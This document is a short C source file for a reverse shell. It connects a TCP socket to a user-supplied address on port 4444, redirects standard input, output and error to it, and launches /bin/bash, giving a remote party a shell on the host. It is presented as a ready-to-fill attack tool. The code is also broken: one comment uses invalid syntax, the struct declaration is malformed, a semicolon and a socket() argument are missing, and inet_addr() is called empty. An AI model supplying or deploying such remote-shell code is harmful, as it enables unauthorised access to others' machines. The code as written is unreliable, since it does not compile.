#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(void) {

    int sockt;
    int port = 4444; #you can define any port 
    struct sockaddr_in_revsockaddr;

    sockt = socket(AF_INET, SOCK_STREAM)
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(); //enter your target ip address

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;
}
